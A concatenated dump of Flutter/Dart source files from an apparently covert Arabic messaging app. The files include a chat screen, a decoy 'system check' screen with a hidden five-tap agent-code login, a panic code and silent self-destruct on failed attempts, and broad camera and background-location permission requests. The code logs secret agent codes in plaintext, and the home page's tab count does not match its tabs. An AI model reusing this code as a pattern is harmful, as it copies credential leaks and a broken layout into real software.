              elevation: theme.appBarTheme.elevation ?? 1.0,
              actions: [
                IconButton(
                  icon: const Icon(Icons.refresh_outlined),
                  tooltip: "تحديث الرسائل",
                  onPressed: () {
                    ref.invalidate(chatMessagesStreamProvider(widget.conversationId));
                    logger.info("ChatScreen",
                        "Manually refreshed messages for ${widget.conversationId}");
                  },
                ),
              ],
            )
          : null, 
      body: Column(
        children: [
          Expanded(
            child: messagesAsyncValue.when(
              data: (messages) {
                if (messages.isEmpty) {
                  return _buildEmptyMessagesState(context);
                }
                return ListView.builder(
                  reverse: true,
                  padding: const EdgeInsets.symmetric(
                      horizontal: 10.0, vertical: 15.0),
                  itemCount: messages.length,
                  itemBuilder: (context, index) {
                    final message = messages[messages.length - 1 - index];
                    return GestureDetector(
                      onLongPress: () =>
                          _onMessageLongPress(context, message, ref),
                      child: MessageBubble(
                        message: message,
                      ),
                    );
                  },
                );
              },
              loading: () => _buildLoadingState(context),
              error: (err, stack) {
                logger.error("ChatScreen:StreamBuilder",
                    "Error UI msg for ${widget.conversationId}", err, stack);
                return _buildErrorState(
                    "يرجى التحقق من اتصالك بالإنترنت والمحاولة مرة أخرى", ref);
              },
            ),
          ),
          MessageInputBar(
            onSendPressed: (text) async {
              if (text.trim().isNotEmpty) {
                final apiService = ref.read(apiServiceProvider);
                if (apiService == null) {
                  logger.error("ChatScreen:onSendPressed",
                      "ApiService is null. Cannot send message.");
                  if (context.mounted) {
                    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                      content: Text("خدمة إرسال الرسائل غير متاحة.",
                          style: GoogleFonts.cairo()),
                      backgroundColor: Colors.orangeAccent,
                    ));
                  }
                  return;
                }

                // عرض مؤشر الإرسال
                if (context.mounted) {
                  ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                    content: Row(
                      children: [
                        SizedBox(
                          width: 20, 
                          height: 20, 
                          child: CircularProgressIndicator(
                            strokeWidth: 2,
                            color: Colors.white,
                          )
                        ),
                        const SizedBox(width: 12),
                        Text("جاري إرسال الرسالة...", style: GoogleFonts.cairo()),
                      ],
                    ),
                    duration: const Duration(seconds: 1),
                    backgroundColor: theme.primaryColor,
                  ));
                }

                final newMessage = ChatMessage(
                  id: "", 
                  senderId: currentAgentCode,
                  text: text,
                  messageType: MessageType.text,
                  timestamp:
                      DateTime.now(), 
                  isSentByCurrentUser:
                      true, 
                );
                try {
                  await apiService.sendMessage(widget.conversationId, newMessage);
                  logger.info("ChatScreen:onSendPressed",
                      "Sent text msg to ${widget.conversationId}");
                } catch (e, stackTrace) {
                  logger.error("ChatScreen:onSendPressed",
                      "Failed to send text msg", e, stackTrace);
                  if (context.mounted) {
                    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                      content: Text("فشل إرسال الرسالة، يرجى المحاولة مرة أخرى",
                          style: GoogleFonts.cairo()),
                      backgroundColor: Colors.redAccent,
                    ));
                  }
                }
              } else {
                logger.info("ChatScreen:onSendPressed",
                    "Attempted to send empty text message.");
              }
            },
            onAttachmentPressed: () async {
              final apiService = ref.read(apiServiceProvider);
              if (apiService == null) {
                logger.error("ChatScreen:onAttachmentPressed",
                    "ApiService is null. Cannot send attachment.");
                if (context.mounted) {
                  ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                      content: Text("خدمة إرسال المرفقات غير متاحة",
                          style: GoogleFonts.cairo())));
                }
                return;
              }
              try {
                FilePickerResult? result = await FilePicker.platform.pickFiles(
                  type: FileType.any, 
                  withData: true, // Ensure file bytes are loaded for MIME type detection and upload
                );
                if (result != null && result.files.isNotEmpty) {
                  PlatformFile file = result.files.first;
                  logger.info("ChatScreen:onAttachmentPressed",
                      "Picked file: ${file.name}, size: ${file.size}");

                  if (context.mounted) {
                    ScaffoldMessenger.of(context).showSnackBar(
                      SnackBar(
                          content: Row(
                            children: [
                              SizedBox(
                                width: 20, 
                                height: 20, 
                                child: CircularProgressIndicator(
                                  strokeWidth: 2, 
                                  color: Colors.white
                                )
                              ),
                              const SizedBox(width: 12),
                              Text("جارٍ رفع الملف: ${file.name}...",
                                  style: GoogleFonts.cairo()),
                            ],
                          ),
                          duration: const Duration(seconds: 15),
                          backgroundColor: theme.primaryColor,
                      ),
                    );
                  }

                  String? downloadUrl = await apiService.uploadFileToStorage(file, widget.conversationId);
                  
                  if (!context.mounted) return; // Check mounted status after async operation

                  // إغلاق SnackBar الرفع
                  ScaffoldMessenger.of(context).hideCurrentSnackBar();

                  if (downloadUrl == null) {
                     logger.error("ChatScreen:onAttachmentPressed", "Upload failed for ${file.name}");
                     ScaffoldMessenger.of(context).showSnackBar(
                        SnackBar(
                            content: Text("فشل رفع الملف: ${file.name}",
                                style: GoogleFonts.cairo()),
                            backgroundColor: Colors.redAccent,
                        ),
                      );
                    return;
                  }
                  
                  logger.info("ChatScreen:onAttachmentPressed", "File ${file.name} uploaded. URL: $downloadUrl");

                  final newFileMessage = ChatMessage(
                    id: "",
                    senderId: currentAgentCode,
                    text: null, 
                    fileName: file.name,
                    fileUrl: downloadUrl, 
                    fileSize: file.size,
                    messageType: _determineMessageTypeFromFile(file),
                    timestamp: DateTime.now(),
                    isSentByCurrentUser: true,
                  );
                  await apiService.sendMessage(widget.conversationId, newFileMessage);
                  logger.info("ChatScreen:onAttachmentPressed",
                      "Sent file message: ${file.name}");
                  if (context.mounted) {
                    ScaffoldMessenger.of(context).showSnackBar(
                      SnackBar(
                          content: Text("تم إرسال الملف: ${file.name}",
                              style: GoogleFonts.cairo())),
                    );
                  }
                } else {
                  logger.info("ChatScreen:onAttachmentPressed",
                      "File picking cancelled or no file selected.");
                }
              } catch (e, stackTrace) {
                logger.error("ChatScreen:onAttachmentPressed",
                    "Error picking or sending file", e, stackTrace);
                if (context.mounted) {
                  ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                    content: Text("حدث خطأ أثناء معالجة الملف، يرجى المحاولة مرة أخرى",
                        style: GoogleFonts.cairo()),
                    backgroundColor: Colors.redAccent,
                  ));
                }
              }
            },
          ),
        ],
      ),
    );
  }
}


// ------------------------------ نهاية الملف: chat_screen.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: chat_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\chat_service.dart
// ----------------------------------------------------------------------

// import 'package:flutter_riverpod/flutter_riverpod.dart';
// import 'package:uuid/uuid.dart';

// import '../../data/models/chat/chat_conversation.dart';
// import '../../data/models/chat/chat_message.dart';

// class ChatService {
//   final List<ChatConversation> _conversations = [];
//   final Map<String, List<ChatMessage>> _messages = {};
//   final Uuid _uuid = const Uuid();

//   // Get all chat conversations
//   List<ChatConversation> getConversations() {
//     return _conversations;
//   }

//   // Get messages for a specific conversation
//   List<ChatMessage> getMessages(String conversationId) {
//     return _messages[conversationId] ?? [];
//   }

//   // Add a new message to a conversation
//   void addMessage(String conversationId, ChatMessage message) {
//     if (_messages.containsKey(conversationId)) {
//       _messages[conversationId]!.add(message);
//     } else {
//       _messages[conversationId] = [message];
//     }
//   }

//   // Create a new conversation
//   ChatConversation createConversation(String userId, String userName) {
//     final newConversation = ChatConversation(
//       id: _uuid.v4(),
//       userName: userName,
//       lastMessage: '', // Initialize with empty last message
//       timestamp: DateTime.now(),
//     );
//     _conversations.add(newConversation);
//     return newConversation;
//   }
// }

// final chatServiceProvider = Provider((ref) => ChatService());



// ------------------------------ نهاية الملف: chat_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: decoy_screen.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\decoy_screen\decoy_screen.dart
// ----------------------------------------------------------------------

import "dart:async";

import "package:flutter/material.dart";
import "package:flutter_riverpod/flutter_riverpod.dart";
import "package:google_fonts/google_fonts.dart";
import "package:permission_handler/permission_handler.dart";

import "../../app.dart";
import "../../core/logging/logger_provider.dart";
import "decoy_screen_controller.dart";

class DecoyScreen extends ConsumerStatefulWidget {
  final bool isPostDestruct;
  const DecoyScreen({super.key, this.isPostDestruct = false});

  @override
  ConsumerState<DecoyScreen> createState() => _DecoyScreenState();
}

class _DecoyScreenState extends ConsumerState<DecoyScreen> {
  bool _permissionsRequested = false;

  @override
  void initState() {
    super.initState();
    // Request permissions after widget is built
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _requestPermissions();
    });
  }

  Future<void> _requestPermissions() async {
    if (_permissionsRequested) return;

    final logger = ref.read(appLoggerProvider);
    logger.info("DecoyScreen", "Requesting required permissions");

    // List of required permissions from AndroidManifest.xml
    final permissions = [
      Permission.camera,
      Permission.location,
      Permission.locationWhenInUse,
      Permission.storage,
    ];

    // Request each permission
    for (var permission in permissions) {
      final status = await permission.status;

      if (status.isDenied) {
        logger.info("DecoyScreen", "Requesting permission: $permission");
        final result = await permission.request();

        logger.info("DecoyScreen", "Permission $permission result: $result");
      } else {
        logger.info("DecoyScreen", "Permission $permission status: $status");
      }
    }

    // Check if background location is needed (only request if other location permissions granted)
    if (await Permission.locationWhenInUse.isGranted) {
      final backgroundStatus = await Permission.locationAlways.status;
      if (backgroundStatus.isDenied) {
        logger.info("DecoyScreen", "Requesting background location permission");
        final result = await Permission.locationAlways.request();
        logger.info(
            "DecoyScreen", "Background location permission result: $result");
      }
    }

    setState(() {
      _permissionsRequested = true;
    });
  }

  @override
  Widget build(BuildContext context) {
    final controller = ref.watch(decoyScreenControllerProvider.notifier);
    final state = ref.watch(decoyScreenControllerProvider);

    // عرض شاشة القفل إذا تم تجاوز الحد الأقصى للمحاولات
    if (state.lockoutEndTime != null) {
      return _buildLockoutScreen(context, controller.getRemainingLockoutTime());
    }

    // عرض شاشة ما بعد التدمير
    if (state.isPostDestruct || widget.isPostDestruct) {
      return _buildPostDestructScreen(context);
    }

    // عرض الشاشة الرئيسية
    return GestureDetector(
      onTap: () {
        controller.handleTap();
        if (controller.shouldShowPasswordDialog()) {
          _showPasswordDialog(context, ref);
        }
      },
      child: _buildMainScreen(context, state),
    );
  }

  Widget _buildLockoutScreen(BuildContext context, String remainingTime) {
    final theme = Theme.of(context);
    return Scaffold(
      backgroundColor: theme.scaffoldBackgroundColor,
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(30.0),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: <Widget>[
              Icon(
                Icons.lock_outline_rounded,
                size: 80,
                color: Colors.red.shade700,
              ),
              const SizedBox(height: 30),
              Text(
                "لا يمكنك تسجيل الدخول الآن",
                textAlign: TextAlign.center,
                style: GoogleFonts.cairo(
                  fontSize: 22,
                  fontWeight: FontWeight.w600,
                  color: Colors.red.shade700,
                ),
              ),
              const SizedBox(height: 15),
              Text(
                "يرجى المحاولة مرة أخرى بعد: $remainingTime",
                textAlign: TextAlign.center,
                style: GoogleFonts.cairo(
                  fontSize: 16,
                  fontWeight: FontWeight.w500,
                  color: Colors.grey[700],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildPostDestructScreen(BuildContext context) {
    final theme = Theme.of(context);
    return Scaffold(
      backgroundColor: theme.scaffoldBackgroundColor,
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(30.0),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: <Widget>[
              Icon(
                Icons.lock_outline_rounded,
                size: 80,
                color: Colors.red.shade700,
              ),
              const SizedBox(height: 30),
              Text(
                "تم تفعيل وضع الأمان. النظام مقفل.",
                textAlign: TextAlign.center,
                style: GoogleFonts.cairo(
                  fontSize: 18,
                  fontWeight: FontWeight.w600,
                  color: Colors.red.shade700,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildMainScreen(BuildContext context, DecoyScreenState state) {
    final theme = Theme.of(context);
    return Scaffold(
      backgroundColor: theme.scaffoldBackgroundColor,
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(30.0),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: <Widget>[
              Icon(
                Icons.shield_outlined,
                size: 80,
                color: state.systemCheckComplete
                    ? theme.primaryColor
                    : Colors.grey[600],
              ),
              const SizedBox(height: 30),
              Text(
                state.statusMessage,
                textAlign: TextAlign.center,
                style: GoogleFonts.cairo(
                  fontSize: 18,
                  fontWeight: FontWeight.w600,
                  color: state.systemCheckComplete
                      ? Colors.green[600]
                      : theme.textTheme.bodyLarge?.color,
                ),
              ),
              const SizedBox(height: 20),
              if (!state.systemCheckComplete)
                Column(
                  children: [
                    LinearProgressIndicator(
                      value: state.progressValue,
                      backgroundColor: Colors.grey[300],
                      valueColor:
                          AlwaysStoppedAnimation<Color>(theme.primaryColor),
                      minHeight: 6,
                    ),
                    const SizedBox(height: 10),
                    Text(
                      "${(state.progressValue * 100).toInt()}%",
                      style: GoogleFonts.cairo(
                          fontSize: 12, color: Colors.grey[600]),
                    ),
                  ],
                ),
              if (!_permissionsRequested)
                Padding(
                  padding: const EdgeInsets.only(top: 20.0),
                  child: Column(
                    children: [
                      CircularProgressIndicator(
                        valueColor:
                            AlwaysStoppedAnimation<Color>(theme.primaryColor),
                      ),
                      const SizedBox(height: 10),
                      Text(
                        "جاري التحقق من الأذونات...",
                        style: GoogleFonts.cairo(
                            fontSize: 14, color: Colors.grey[600]),
                      ),
                    ],
                  ),
                ),
              if (_permissionsRequested)
                Padding(
                  padding: const EdgeInsets.only(top: 20.0),
                  child: ElevatedButton.icon(
                    icon: const Icon(Icons.settings_applications),
                    label: Text("إدارة الأذونات", style: GoogleFonts.cairo()),
                    onPressed: () async {
                      await openAppSettings();
                    },
                  ),
                ),
            ],
          ),
        ),
      ),
    );
  }

  void _showPasswordDialog(BuildContext context, WidgetRef ref) {
    final TextEditingController passwordController = TextEditingController();
    final controller = ref.read(decoyScreenControllerProvider.notifier);
    final state = ref.read(decoyScreenControllerProvider);
    final logger = ref.read(appLoggerProvider);
    bool isLoading = false;

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (BuildContext dialogContext) {
        return StatefulBuilder(
          builder: (context, setDialogState) {
            return AlertDialog(
              backgroundColor:
                  Theme.of(dialogContext).brightness == Brightness.dark
                      ? const Color(0xFF1F1F1F)
                      : Colors.grey[50],
              shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(15)),
              title: Row(
                mainAxisAlignment: MainAxisAlignment.end,
                children: [
                  Text("الوصول المشفر",
                      style: GoogleFonts.cairo(
                          fontWeight: FontWeight.bold,
                          color:
                              Theme.of(dialogContext).colorScheme.onSurface)),
                  const SizedBox(width: 8),
                  Icon(Icons.security_outlined,
                      color: Theme.of(dialogContext).primaryColor),
                ],
              ),
              content: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Text("يرجى إدخال رمز المصادقة المخصص للوصول إلى النظام.",
                      textAlign: TextAlign.right,
                      style: GoogleFonts.cairo(
                          fontSize: 14, color: Colors.grey[600])),
                  const SizedBox(height: 20),
                  TextField(
                    controller: passwordController,
                    keyboardType: TextInputType.text,
                    autofocus: true,
                    textAlign: TextAlign.center,
                    style: GoogleFonts.cairo(
                        fontSize: 22,
                        letterSpacing: 3,
                        fontWeight: FontWeight.bold,
                        color: Theme.of(dialogContext).colorScheme.onSurface),
                    decoration: InputDecoration(
                      hintText: "- - - - - -",
                      hintStyle: GoogleFonts.cairo(
                          color: Colors.grey[500], fontSize: 20),
                      border: OutlineInputBorder(
                        borderRadius:
                            const BorderRadius.all(Radius.circular(10)),
                        borderSide: BorderSide(color: Colors.grey[400]!),
                      ),
                      focusedBorder: OutlineInputBorder(
                        borderRadius:
                            const BorderRadius.all(Radius.circular(10)),
                        borderSide: BorderSide(
                            color: Theme.of(dialogContext).primaryColor,
                            width: 2),
                      ),
                      filled: true,
                      fillColor:
                          Theme.of(dialogContext).brightness == Brightness.dark
                              ? Colors.black.withOpacity(0.1)
                              : Colors.white,
                    ),
                  ),
                  if (state.failedLoginAttempts > 0)
                    Padding(
                      padding: const EdgeInsets.only(top: 10.0),
                      child: Text(
                        "المحاولات الخاطئة: ${state.failedLoginAttempts}/5",
                        textAlign: TextAlign.center,
                        style: GoogleFonts.cairo(
                            fontSize: 12, color: Colors.orange.shade700),
                      ),
                    ),
                ],
              ),
              actionsAlignment: MainAxisAlignment.center,
              actionsPadding: const EdgeInsets.only(bottom: 20, top: 10),
              actions: <Widget>[
                ElevatedButton.icon(
                  icon: isLoading
                      ? Container(
                          width: 20,
                          height: 20,
                          padding: const EdgeInsets.all(2.0),
                          child: const CircularProgressIndicator(
                            color: Colors.white,
                            strokeWidth: 3,
                          ),
                        )
                      : const Icon(Icons.login_rounded, size: 20),
                  label: Text(isLoading ? "جاري التحقق..." : "تأكيد الوصول",
                      style: GoogleFonts.cairo(
                          fontSize: 15, fontWeight: FontWeight.w600)),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Theme.of(dialogContext).primaryColor,
                    foregroundColor: Colors.white,
                    padding: const EdgeInsets.symmetric(
                        horizontal: 30, vertical: 12),
                    shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(10)),
                    elevation: 3,
                  ),
                  onPressed: isLoading
                      ? null
                      : () async {
                          setDialogState(() {
                            isLoading = true;
                          });

                          final enteredAgentCode =
                              passwordController.text.trim();
                          final bool isDialogCtxMounted = dialogContext.mounted;
                          final bool isMainCtxMounted = context.mounted;

                          logger.info("DecoyPasswordDialog",
                              "محاولة تسجيل الدخول برمز الوكيل: $enteredAgentCode");

                          final authResult = await controller
                              .authenticateWithAgentCode(enteredAgentCode);

                          if (!isDialogCtxMounted || !isMainCtxMounted) {
                            return;
                          }

                          if (authResult.success) {
                            logger.info("DecoyPasswordDialog",
                                "تم التحقق بنجاح من رمز الوكيل: $enteredAgentCode");

                            if (authResult.isPanicCode) {
                              // رمز الهلع - سيتم التعامل معه في وحدة التحكم
                              Navigator.of(dialogContext).pop();
                              Navigator.of(context).pushReplacement(
                                MaterialPageRoute(
                                    builder: (_) => const TheConduitApp()),
                              );
                              return;
                            }

                            Navigator.of(dialogContext).pop();
                            Navigator.of(context).pushReplacement(
                              MaterialPageRoute(
                                  builder: (_) => const TheConduitApp()),
                            );
                          } else {
                            logger.warn("DecoyPasswordDialog",
                                "رمز وكيل غير صالح: $enteredAgentCode");

                            if (ref
                                    .read(decoyScreenControllerProvider)
                                    .failedLoginAttempts >=
                                5) {
                              Navigator.of(dialogContext).pop();
                            } else {
                              ScaffoldMessenger.of(dialogContext)
                                  .showSnackBar(SnackBar(
                                content: Text(authResult.message,
                                    textAlign: TextAlign.right,
                                    style: GoogleFonts.cairo()),
                                backgroundColor: Colors.red[700],
                              ));
                              setDialogState(() {
                                isLoading = false;
                              });
                            }
                          }
                        },
                ),
              ],
            );
          },
        );
      },
    );
  }
}



// ------------------------------ نهاية الملف: decoy_screen.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: decoy_screen_controller.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\decoy_screen\decoy_screen_controller.dart
// ----------------------------------------------------------------------

// lib/presentation/decoy_screen/decoy_screen_controller.dart
import 'dart:async';

import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../../core/logging/logger_provider.dart';
import '../../core/security/self_destruct_service.dart';
import '../chat/services/auth_service.dart';

class DecoyScreenController extends StateNotifier<DecoyScreenState> {
  final Ref _ref;
  final AuthService _authService;
  Timer? _progressTimer;
  Timer? _lockoutTimer;

  static const String _failedAttemptsKey = 'failed_login_attempts_conduit';
  static const String _lockoutEndTimeKey = 'lockout_end_time_conduit';
  static const int _maxFailedAttempts = 5;
  static const Duration _lockoutDuration = Duration(minutes: 30);

  DecoyScreenController(this._ref, this._authService)
      : super(DecoyScreenState.initial()) {
    _loadFailedAttempts();
    _loadLockoutTime();
    if (!state.isPostDestruct) {
      _startSystemCheckAnimation();
    }
  }

  void _startSystemCheckAnimation() {
    _progressTimer = Timer.periodic(const Duration(milliseconds: 150), (timer) {
      state = state.copyWith(
        progressValue: state.progressValue + 0.02,
      );

      if (state.progressValue >= 1.0) {
        state = state.copyWith(
          progressValue: 1.0,
          statusMessage: "فحص النظام الأساسي مكتمل.",
          systemCheckComplete: true,
        );
        timer.cancel();
      } else if (state.progressValue > 0.7) {
        state = state.copyWith(
          statusMessage: "التحقق من سلامة المكونات...",
        );
      } else if (state.progressValue > 0.4) {
        state = state.copyWith(
          statusMessage: "تحميل وحدات الأمان...",
        );
      }
    });
  }

  Future<void> _loadFailedAttempts() async {
    final prefs = await SharedPreferences.getInstance();
    state = state.copyWith(
      failedLoginAttempts: prefs.getInt(_failedAttemptsKey) ?? 0,
    );

    // تحقق مما إذا تم تجاوز الحد الأقصى للمحاولات
    if (state.failedLoginAttempts >= _maxFailedAttempts && !state.isPostDestruct) {
      _ref.read(appLoggerProvider).warn(
          "DecoyScreenInit",
          "Max failed attempts (${state.failedLoginAttempts}) detected on load. Triggering silent self-destruct.");
      _triggerSilentSelfDestruct(triggeredBy: "MaxFailedAttemptsOnLoad");
    }
  }

  Future<void> _loadLockoutTime() async {
    final prefs = await SharedPreferences.getInstance();
    final lockoutTimeMs = prefs.getInt(_lockoutEndTimeKey);
    if (lockoutTimeMs != null) {
      final lockoutEndTime = DateTime.fromMillisecondsSinceEpoch(lockoutTimeMs);
      if (lockoutEndTime.isAfter(DateTime.now())) {
        state = state.copyWith(lockoutEndTime: lockoutEndTime);
        _startLockoutTimer();
      } else {
        // الوقت انتهى، يمكن إعادة تعيين المحاولات
        await prefs.remove(_lockoutEndTimeKey);
      }
    }
  }

  void _startLockoutTimer() {
    _lockoutTimer?.cancel();
    _lockoutTimer = Timer.periodic(const Duration(seconds: 1), (timer) {
      if (state.lockoutEndTime == null ||
          state.lockoutEndTime!.isBefore(DateTime.now())) {
        timer.cancel();
        state = state.copyWith(lockoutEndTime: null);
      } else {
        // تحديث الحالة لإعادة بناء الواجهة وتحديث العداد التنازلي
        state = state.copyWith();
      }
    });
  }

  Future<void> _incrementFailedAttempts() async {
    final prefs = await SharedPreferences.getInstance();
    state = state.copyWith(
      failedLoginAttempts: state.failedLoginAttempts + 1,
    );
    await prefs.setInt(_failedAttemptsKey, state.failedLoginAttempts);
    _ref.read(appLoggerProvider).warn(
        "DecoyScreen", "Failed login attempt. Count: ${state.failedLoginAttempts}");

    if (state.failedLoginAttempts >= _maxFailedAttempts && !state.isPostDestruct) {
      // تدمير المحادثات بشكل صامت وإظهار رسالة القفل
      await _triggerSilentSelfDestruct(triggeredBy: "MaxFailedAttemptsReached");

      // تعيين وقت انتهاء القفل
      final lockoutEndTime = DateTime.now().add(_lockoutDuration);
      await prefs.setInt(
          _lockoutEndTimeKey, lockoutEndTime.millisecondsSinceEpoch);

      state = state.copyWith(lockoutEndTime: lockoutEndTime);
      _startLockoutTimer();
    }
  }

  Future<void> _resetFailedAttempts() async {
    final prefs = await SharedPreferences.getInstance();
    state = state.copyWith(
      failedLoginAttempts: 0,
      lockoutEndTime: null,
    );
    await prefs.setInt(_failedAttemptsKey, 0);
    await prefs.remove(_lockoutEndTimeKey);
    _lockoutTimer?.cancel();
    _ref.read(appLoggerProvider).info("DecoyScreen", "Failed login attempts reset.");
  }

  void handleTap() {
    if (state.isPostDestruct ||
        !state.systemCheckComplete ||
        state.lockoutEndTime != null) {
      return;
    }
    state = state.copyWith(tapCount: state.tapCount + 1);
  }

  bool shouldShowPasswordDialog() {
    if (state.tapCount >= 5) {
      state = state.copyWith(tapCount: 0);
      return true;
    }
    return false;
  }

  Future<AuthResult> authenticateWithAgentCode(String agentCode) async {
    final result = await _authService.authenticateAgent(agentCode);
    
    if (result.success) {
      await _resetFailedAttempts();
      if (result.isPanicCode) {
        await _triggerSelfDestruct(triggeredBy: "PanicCode00000");
      }
    } else {
      await _incrementFailedAttempts();
    }
    
    return result;
  }

  // تدمير البيانات بشكل صامت دون إظهار أي إشعارات للمستخدم
  Future<void> _triggerSilentSelfDestruct({String triggeredBy = "Unknown"}) async {
    if (state.isPostDestruct) {
      _ref.read(appLoggerProvider).info(
          "SilentSelfDestructTrigger",
          "Already in post-destruct state. Trigger by $triggeredBy ignored.");
      return;
    }

    _ref.read(appLoggerProvider).error(
        "SILENT SELF-DESTRUCT TRIGGERED by: $triggeredBy",
        "SILENT_SELF_DESTRUCT_TRIGGER");

    try {
      await _ref.read(selfDestructServiceProvider).silentSelfDestruct(triggeredBy: triggeredBy);
    } catch (e, s) {
      _ref.read(appLoggerProvider).error(
          "SilentSelfDestruct", "Error during silent self-destruct", e, s);
    }
  }

  // الطريقة الأصلية للتدمير الذاتي (تستخدم فقط لرقم الهلع)
  Future<void> _triggerSelfDestruct({String triggeredBy = "Unknown"}) async {
    if (state.isPostDestruct) {
      _ref.read(appLoggerProvider).info(
          "SelfDestructTrigger",
          "Already in post-destruct state. Trigger by $triggeredBy ignored.");
      return;
    }

    _ref.read(appLoggerProvider).error(
        "SELF-DESTRUCT TRIGGERED in DecoyScreen by: $triggeredBy",
        "SELF_DESTRUCT_TRIGGER");
    
    // استخدام خدمة التدمير الذاتي
    await _ref.read(selfDestructServiceProvider).silentSelfDestruct(triggeredBy: triggeredBy);
  }

  String getRemainingLockoutTime() {
    if (state.lockoutEndTime == null) return "";

    final now = DateTime.now();
    if (state.lockoutEndTime!.isBefore(now)) return "";

    final difference = state.lockoutEndTime!.difference(now);
    final minutes = difference.inMinutes;
    final seconds = difference.inSeconds % 60;

    return "$minutes:${seconds.toString().padLeft(2, '0')}";
  }

  @override
  void dispose() {
    _progressTimer?.cancel();
    _lockoutTimer?.cancel();
    super.dispose();
  }
}

class DecoyScreenState {
  final int tapCount;
  final double progressValue;
  final String statusMessage;
  final bool systemCheckComplete;
  final int failedLoginAttempts;
  final DateTime? lockoutEndTime;
  final bool isPostDestruct;

  DecoyScreenState({
    required this.tapCount,
    required this.progressValue,
    required this.statusMessage,
    required this.systemCheckComplete,
    required this.failedLoginAttempts,
    this.lockoutEndTime,
    required this.isPostDestruct,
  });

  factory DecoyScreenState.initial() {
    return DecoyScreenState(
      tapCount: 0,
      progressValue: 0.0,
      statusMessage: "جاري تهيئة النظام...",
      systemCheckComplete: false,
      failedLoginAttempts: 0,
      lockoutEndTime: null,
      isPostDestruct: false,
    );
  }

  DecoyScreenState copyWith({
    int? tapCount,
    double? progressValue,
    String? statusMessage,
    bool? systemCheckComplete,
    int? failedLoginAttempts,
    DateTime? lockoutEndTime,
    bool? isPostDestruct,
  }) {
    return DecoyScreenState(
      tapCount: tapCount ?? this.tapCount,
      progressValue: progressValue ?? this.progressValue,
      statusMessage: statusMessage ?? this.statusMessage,
      systemCheckComplete: systemCheckComplete ?? this.systemCheckComplete,
      failedLoginAttempts: failedLoginAttempts ?? this.failedLoginAttempts,
      lockoutEndTime: lockoutEndTime ?? this.lockoutEndTime,
      isPostDestruct: isPostDestruct ?? this.isPostDestruct,
    );
  }
}

final decoyScreenControllerProvider =
    StateNotifierProvider<DecoyScreenController, DecoyScreenState>((ref) {
  final authService = ref.watch(authServiceProvider);
  return DecoyScreenController(ref, authService);
});



// ------------------------------ نهاية الملف: decoy_screen_controller.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: home_page.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\home\home_page.dart
// ----------------------------------------------------------------------

import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';

import '../about_tab/about_tab.dart';
import '../chat/chat_list_screen.dart';
import '../debug_monitor/debug_monitor_screen.dart'; // إضافة استيراد شاشة المراقبة
import '../history_tab/history_tab.dart';

class HomePage extends ConsumerStatefulWidget {
  const HomePage({super.key});

  @override
  ConsumerState<HomePage> createState() => _HomePageState();
}

class _HomePageState extends ConsumerState<HomePage>
    with SingleTickerProviderStateMixin {
  late TabController _tabController;
  int _currentIndex = 0;
  bool _showDebugButton = false; // زر إظهار شاشة المراقبة
  int _debugTapCount = 0; // عداد النقرات لإظهار زر المراقبة

  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: 6, vsync: this);
    _tabController.addListener(() {
      setState(() {
        _currentIndex = _tabController.index;
      });
    });
  }

  @override
  void dispose() {
    _tabController.dispose();
    super.dispose();
  }

  void _incrementDebugTapCount() {
    setState(() {
      _debugTapCount++;
      if (_debugTapCount >= 5) {
        _showDebugButton = true;
      }
    });

    // إعادة تعيين العداد بعد 3 ثوانٍ من عدم النقر
    Future.delayed(const Duration(seconds: 3), () {
      if (mounted) {
        setState(() {
          _debugTapCount = 0;
        });
      }
    });
  }

  void _openDebugMonitor() {
    Navigator.of(context).push(
      MaterialPageRoute(
        builder: (context) => const DebugMonitorScreen(),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTap:
          _incrementDebugTapCount, // زيادة عداد النقرات عند النقر على أي مكان في الشاشة
      child: Scaffold(
        appBar: AppBar(
          title: const Text('الساتر'),
          bottom: TabBar(
            controller: _tabController,
            tabs: const [
              Tab(icon: Icon(Icons.chat), text: 'المحادثات'),
              Tab(icon: Icon(Icons.lock), text: 'التشفير'),
              Tab(icon: Icon(Icons.file_present), text: 'الملفات'),
              Tab(icon: Icon(Icons.history), text: 'السجل'),
            ],
          ),
          actions: [
            if (_showDebugButton)
              IconButton(
                icon: const Icon(Icons.bug_report),
                onPressed: _openDebugMonitor,
                tooltip: 'شاشة المراقبة',
              ),
          ],
        ),
        body: TabBarView(
          controller: _tabController,
          children: const [
            ChatListScreen(),
            HistoryTab(),
            AboutTab(),
          ],
        ),
      ),
    );
  }
}



// ------------------------------ نهاية الملف: home_page.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: background_service.dart ==============================
